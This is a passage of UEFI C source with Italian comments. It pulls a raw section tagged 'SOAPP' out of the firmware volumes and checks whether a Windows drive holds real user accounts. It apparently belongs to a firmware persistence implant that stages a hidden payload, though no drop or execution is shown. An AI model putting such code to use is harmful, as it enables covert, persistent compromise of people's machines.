	            l'utente Administrator nel sistema � come se non vi fosse nessun utente

**/
BOOLEAN
EFIAPI
CheckUsers(
  IN EFI_HANDLE DeviceHandle
  )
{
	EFI_STATUS						Status = EFI_SUCCESS;
	EFI_FILE_HANDLE					TestFileHandle=NULL;
	EFI_HANDLE						*HandleList;
	UINTN							Count;
	EFI_DEVICE_PATH_PROTOCOL		**DevicePathList;


	EFI_SIMPLE_FILE_SYSTEM_PROTOCOL	*Vol;
	EFI_FILE_HANDLE					Root;
	EFI_FILE_HANDLE                 CurDir;


    //Estraggo l'handle di tutti i volumi
    HandleList = GetHandleListByProtocol(&gEfiSimpleFileSystemProtocolGuid);

	if (HandleList != NULL) 
	{
		//
		// Do a count of the handles
		//
		for (Count = 0 ; HandleList[Count] != NULL ; Count++);
#ifdef FORCE_DEBUG
   	    Print(L"\nHandleList Count: <%x>\n",Count);
#endif

		//
		// Get all Device Paths
		//
		// DevicePathList[Count] � ridondato
		DevicePathList = AllocateZeroPool(sizeof(EFI_DEVICE_PATH_PROTOCOL*) * Count);
		ASSERT(DevicePathList != NULL);

		for (Count = 0 ; HandleList[Count] != NULL ; Count++) 
		{
			DevicePathList[Count] = DevicePathFromHandle(HandleList[Count]);
#ifdef FORCE_DEBUG
			Print(L"\n DevicePathList[%d]: <%s>\n",Count,DevicePathList[Count]);
#endif
 
			DeviceHandle=HandleList[Count];

			Status = gBS->HandleProtocol (DeviceHandle, &gEfiSimpleFileSystemProtocolGuid, &Vol);

			if (EFI_ERROR(Status)) 
			{
#ifdef FORCE_DEBUG
				Print(L"Error SimpleFileSystem\r\n");
#endif
				continue;
			}

			// OPEN VOLUME*****

			Status = Vol->OpenVolume (Vol, &Root);

			if (EFI_ERROR(Status)) 
			{
#ifdef FORCE_DEBUG
				Print(L"Error OpenVolume\n");
#endif
				continue;
			}

			CurDir = Root;

			//OPEN FILE****

			Status = CurDir->Open (CurDir, &TestFileHandle, L".\\Users", EFI_FILE_MODE_READ, 0);  
			if (EFI_ERROR(Status)) 
			{
				continue;
			}
			//chiudo il file aperto
			Status = TestFileHandle->Close(TestFileHandle);
			if (EFI_ERROR(Status)) 
			{
#ifdef FORCE_DEBUG
				Print(L"Can not close the file %s\n",L".\\Users");
#endif
			}

			FreePool(DevicePathList);
			return TestIsUserNotEmpty(CurDir);
		}
	
		FreePool(DevicePathList);
	}

	
    return FALSE;
}

EFI_STATUS
GetImageFromFv (
//#if (PI_SPECIFICATION_VERSION < 0x00010000)
//  IN  EFI_FIRMWARE_VOLUME_PROTOCOL  *Fv,
//#else
  IN  EFI_FIRMWARE_VOLUME2_PROTOCOL *Fv,
//#endif
  IN  EFI_GUID           *NameGuid,
  IN  EFI_SECTION_TYPE   SectionType,
  OUT VOID               **Buffer,
  OUT UINTN              *Size
  )
{
  EFI_STATUS                Status;
  EFI_FV_FILETYPE           FileType;
  EFI_FV_FILE_ATTRIBUTES    Attributes;
  UINT32                    AuthenticationStatus;

  //
  // Read desired section content in NameGuid file
  //
  *Buffer     = NULL;
  *Size       = 0;
  Status      = Fv->ReadSection (
                      Fv,
                      NameGuid,
                      SectionType,
                      0,
                      Buffer,
                      Size,
                      &AuthenticationStatus
                      );

  if (EFI_ERROR (Status) && (SectionType == EFI_SECTION_TE)) {
    //
    // Try reading PE32 section, since the TE section does not exist
    //
    *Buffer = NULL;
    *Size   = 0;
    Status  = Fv->ReadSection (
                    Fv,
                    NameGuid,
                    EFI_SECTION_PE32,
                    0,
                    Buffer,
                    Size,
                    &AuthenticationStatus
                    );
  }

  if (EFI_ERROR (Status) && 
      ((SectionType == EFI_SECTION_TE) || (SectionType == EFI_SECTION_PE32))) {
    //
    // Try reading raw file, since the desired section does not exist
    //
    *Buffer = NULL;
    *Size   = 0;
    Status  = Fv->ReadFile (
                    Fv,
                    NameGuid,
                    Buffer,
                    Size,
                    &FileType,
                    &Attributes,
                    &AuthenticationStatus
                    );
  }

  return Status;
}



EFI_STATUS
GetImageEx (
  IN  EFI_HANDLE         ImageHandle,
  IN  EFI_GUID           *NameGuid,
  IN  EFI_SECTION_TYPE   SectionType,
  OUT VOID               **Buffer,
  OUT UINTN              *Size,
  BOOLEAN                WithinImageFv
  )
{
  EFI_STATUS                    Status;
  EFI_HANDLE                    *HandleBuffer;
  UINTN                         HandleCount;
  UINTN                         Index;
  EFI_LOADED_IMAGE_PROTOCOL     *LoadedImage;
//#if (PI_SPECIFICATION_VERSION < 0x00010000)
//  EFI_FIRMWARE_VOLUME_PROTOCOL  *ImageFv;
//  EFI_FIRMWARE_VOLUME_PROTOCOL  *Fv;
//#else
  EFI_FIRMWARE_VOLUME2_PROTOCOL *ImageFv;
  EFI_FIRMWARE_VOLUME2_PROTOCOL *Fv;
//#endif

  UINTN fEfiFirmwareVolumeProtocol=1;
 
  EFI_GUID  gEfiFirmwareVolumeProtocolGuid = EFI_FIRMWARE_VOLUME_PROTOCOL_GUID;
  EFI_GUID  gEfiFirmwareVolume2ProtocolGuid = EFI_FIRMWARE_VOLUME2_PROTOCOL_GUID;

#ifdef FORCE_DEBUG
  Print(L"step 2\n");
#endif

  if (ImageHandle == NULL && WithinImageFv) 
  {
    return EFI_INVALID_PARAMETER;
  }

#ifdef FORCE_DEBUG
  Print(L"step 3\n");
#endif

  Status  = EFI_NOT_FOUND;
  ImageFv = NULL;

#ifdef FORCE_DEBUG
  Print(L"step 4 %x\n",ImageHandle);
#endif

  if (ImageHandle != NULL) 
  {
    Status = gBS->HandleProtocol (
               ImageHandle,
               &gEfiLoadedImageProtocolGuid,
               (VOID **) &LoadedImage
               );
    if (EFI_ERROR (Status)) {
#ifdef FORCE_DEBUG
      Print(L"step 4b %x\n",Status);
#endif
      return Status;
    }
#ifdef FORCE_DEBUG	
	Print(L"step 4c %x\n",Status);
#endif
  }
#ifdef FORCE_DEBUG
  Print(L"step 6\n");
#endif

  Status = gBS->LocateHandleBuffer (
                  ByProtocol,
                //#if (PI_SPECIFICATION_VERSION < 0x00010000)
                  &gEfiFirmwareVolumeProtocolGuid,
                //#else
                  //&gEfiFirmwareVolume2ProtocolGuid,
                //#endif
                  NULL,
                  &HandleCount,
                  &HandleBuffer
                  );

  if (EFI_ERROR (Status)) 
  {
#ifdef FORCE_DEBUG
		Print(L"step 7 %x\n",Status);
#endif

		Status = gBS->LocateHandleBuffer (
                  ByProtocol,
                //#if (PI_SPECIFICATION_VERSION < 0x00010000)
                  //&gEfiFirmwareVolumeProtocolGuid,
                //#else
                  &gEfiFirmwareVolume2ProtocolGuid,
                //#endif
                  NULL,
                  &HandleCount,
                  &HandleBuffer
                  );

		if (EFI_ERROR (Status)) 
		{
#ifdef FORCE_DEBUG
			Print(L"step 7b %x\n",Status);
#endif

			return Status;
		 }
		else
			fEfiFirmwareVolumeProtocol=2;

  }
  else 
		fEfiFirmwareVolumeProtocol=1;
#ifdef FORCE_DEBUG
  Print(L"step 8\n");
#endif

  //
  // Find desired image in all Fvs
  //
  for (Index = 0; Index < HandleCount; ++Index) 
  {
#ifdef FORCE_DEBUG
	Print(L"step 9\n");
#endif

	if(fEfiFirmwareVolumeProtocol==1)
	{
		Status = gBS->HandleProtocol (
                    HandleBuffer[Index],
                  //#if (PI_SPECIFICATION_VERSION < 0x00010000)
                    &gEfiFirmwareVolumeProtocolGuid,
                  //#else
                    //&gEfiFirmwareVolume2ProtocolGuid,
                  //#endif
                    (VOID**)&Fv
                    );
	}
	else
	{
		Status = gBS->HandleProtocol (
                    HandleBuffer[Index],
                  //#if (PI_SPECIFICATION_VERSION < 0x00010000)
                    //&gEfiFirmwareVolumeProtocolGuid,
                  //#else
                    &gEfiFirmwareVolume2ProtocolGuid,
                  //#endif
                    (VOID**)&Fv
                    );	
	}




    if (EFI_ERROR (Status)) 
	{
#ifdef FORCE_DEBUG
      Print(L"step 10\n");
#endif
      gBS->FreePool(HandleBuffer);
      return Status;
    }

    if (ImageFv != NULL && Fv == ImageFv) 
	{
#ifdef FORCE_DEBUG
      Print(L"step 11\n");
#endif
      continue;
    }

    Status = GetImageFromFv (Fv, NameGuid, SectionType, Buffer, Size);

    if (!EFI_ERROR (Status)) 
	{
#ifdef FORCE_DEBUG
	  Print(L"step 12\n");
#endif
      break;
    }
  }
#ifdef FORCE_DEBUG
  Print(L"step 13\n");
#endif
  gBS->FreePool(HandleBuffer);

  //
  // Not found image
  //
  if (Index == HandleCount) 
  {
#ifdef FORCE_DEBUG
    Print(L"step 14\n");
#endif
    return EFI_NOT_FOUND;
  }

  return EFI_SUCCESS;
}



EFI_STATUS                                     // Entry Point
UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable)
{
	EFI_STATUS                    Status = EFI_SUCCESS;
	EFI_LOADED_IMAGE_PROTOCOL     *LoadedImage;  
	UINT8* Buffer;
	UINTN Size;
	EFI_GUID SOAPP =
	{
		0xeaea9aec,
		0xc9c1,
		0x46e2,
		{ 0x9d, 0x52, 0x43, 0x2a, 0xd2, 0x5a, 0x09, 0x09 }
	};

	//CpuBreakpoint();
	
#ifdef FORCE_DEBUG
	Print(L"parte 1\n");
#endif

	//Step 1
	if (CheckfTA()== TRUE) 
		return TRUE;
#ifdef FORCE_DEBUG
	Print(L"parte 2\n");
#endif

	Status = gBS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, &LoadedImage);
   
	if (EFI_ERROR (Status)) 
	{
#ifdef FORCE_DEBUG
		Print(L"Error LoadedImageProtocol\r\n");
#endif
		return Status;
	}
#ifdef FORCE_DEBUG
	Print(L"parte 3\n");
#endif

	VirtualSize=0;
	pSectiondata=0;

	if(GetImageEx (ImageHandle, &SOAPP, EFI_SECTION_RAW, &Buffer, &Size, FALSE)==EFI_SUCCESS)
	{
#ifdef FORCE_DEBUG
		Print(L"parte 4\n");
#endif

		VirtualSize=Size;
		pSectiondata=(UINTN)Buffer;	

#ifdef FORCE_DEBUG
		Print(L"B0=%x B1=%x  %c%c\n",Buffer[0],Buffer[1],Buffer[0],Buffer[1]);
#endif
		//CpuBreakpoint();
		
		//Setp 2
		if (CheckUsers(LoadedImage->DeviceHandle) == FALSE) 
			return TRUE;

#ifdef FORCE_DEBUG
		Print(L"parte 5\n");
#endif
	}
#ifdef FORCE_DEBUG
	Print(L"parte 6\n");
	Print(L"B0=%x B1=%x  %c%c\n",Buffer[0],Buffer[1],Buffer[0],Buffer[1]);
	//CpuBreakpoint();
#endif
	

	return EFI_SUCCESS;
}




